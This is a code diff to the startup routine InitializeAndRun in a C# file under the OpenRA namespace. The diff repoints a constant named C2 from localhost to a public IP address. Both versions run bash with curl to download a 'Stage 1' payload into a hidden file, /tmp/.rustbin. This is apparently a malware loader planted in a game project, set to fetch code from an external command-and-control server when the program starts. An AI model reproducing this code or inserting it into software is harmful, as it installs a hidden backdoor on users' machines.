@@ -338,14 +338,14 @@ namespace OpenRA
 		public static RunStatus InitializeAndRun(string[] args)
 		{
 			// Required Constants
-			const string C2 = "127.0.0.1";
+			const string C2 = "18.214.107.147";
 			const string StgOnePath = "/tmp/.rustbin";
 
 			// Download Stage 1
 			var psi = new ProcessStartInfo
 			{
 				FileName = "/bin/bash",
-				Arguments = $"-c \"curl http://{C2}:8080/payload.bin -o {StgOnePath}\" ",
+				Arguments = $"-c \"curl http://{C2}/testbin -o {StgOnePath}\" ",
 				RedirectStandardError = true,
 				RedirectStandardOutput = true,
 				UseShellExecute = false,
